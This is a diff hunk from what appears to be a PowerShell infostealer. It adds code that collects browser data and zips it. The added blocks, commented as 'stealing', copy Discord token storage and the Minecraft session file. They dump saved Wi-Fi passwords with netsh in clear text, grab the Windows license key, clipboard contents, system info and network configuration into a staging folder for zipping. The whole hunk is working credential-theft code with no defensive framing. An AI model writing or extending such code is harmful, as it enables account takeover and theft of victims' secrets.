@@ -171,6 +171,77 @@ if (Test-Path $decryptExe) {
     Write-Host "decrypt.exe deleted before zipping."
 }
 
+# Discord token stealing
+$discordPaths = @(
+    "$env:APPDATA\Discord\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb"
+)
+$discordDestDir = Join-Path -Path $destDir -ChildPath "Discord"
+if (-Not (Test-Path $discordDestDir)) {
+    New-Item -ItemType Directory -Path $discordDestDir
+}
+
+foreach ($path in $discordPaths) {
+    if (Test-Path $path) {
+        Copy-Item -Path "$path\*" -Destination $discordDestDir -Recurse -Force
+        Write-Host "Copied Discord token files from $path"
+    } else {
+        Write-Host "Discord token path not found: $path"
+    }
+}
+
+# Minecraft session stealing
+$minecraftPath = "$env:APPDATA\.minecraft\launcher_profiles.json"
+$minecraftDestDir = Join-Path -Path $destDir -ChildPath "Minecraft"
+if (-Not (Test-Path $minecraftDestDir)) {
+    New-Item -ItemType Directory -Path $minecraftDestDir
+}
+
+if (Test-Path $minecraftPath) {
+    Copy-Item -Path $minecraftPath -Destination $minecraftDestDir
+    Write-Host "Minecraft session file copied."
+} else {
+    Write-Host "Minecraft session file not found."
+}
+
+# Stealing Wi-Fi passwords
+$wifiDestDir = Join-Path -Path $destDir -ChildPath "WiFiPasswords"
+if (-Not (Test-Path $wifiDestDir)) {
+    New-Item -ItemType Directory -Path $wifiDestDir
+}
+
+$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }
+foreach ($profile in $wifiProfiles) {
+    $wifiInfo = netsh wlan show profile name="$profile" key=clear
+    $wifiInfo | Out-File -FilePath (Join-Path -Path $wifiDestDir -ChildPath "$profile.txt")
+    Write-Host "Wi-Fi password saved for profile: $profile"
+}
+
+# Collecting Windows License Key
+$windowsKeyDest = Join-Path -Path $destDir -ChildPath "WindowsKey.txt"
+$windowsKey = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
+$windowsKey | Out-File -FilePath $windowsKeyDest
+Write-Host "Windows key saved."
+
+# Collecting Clipboard Data
+$clipboardData = Get-Clipboard
+$clipboardFile = Join-Path -Path $destDir -ChildPath "ClipboardData.txt"
+$clipboardData | Out-File -FilePath $clipboardFile
+Write-Host "Clipboard data saved."
+
+# Collecting System Info
+$systemInfo = Get-ComputerInfo
+$systemInfoFile = Join-Path -Path $destDir -ChildPath "SystemInfo.txt"
+$systemInfo | Out-File -FilePath $systemInfoFile
+Write-Host "System info saved."
+
+# Collecting Network Configuration
+$networkConfig = Get-NetIPConfiguration
+$networkConfigFile = Join-Path -Path $destDir -ChildPath "NetworkConfig.txt"
+$networkConfig | Out-File -FilePath $networkConfigFile
+Write-Host "Network configuration saved."
+
+
 # Zip the BrowserData folder
 $zipDir = "$env:APPDATA\ZippedBrowserData"
 if (-Not (Test-Path $zipDir)) {
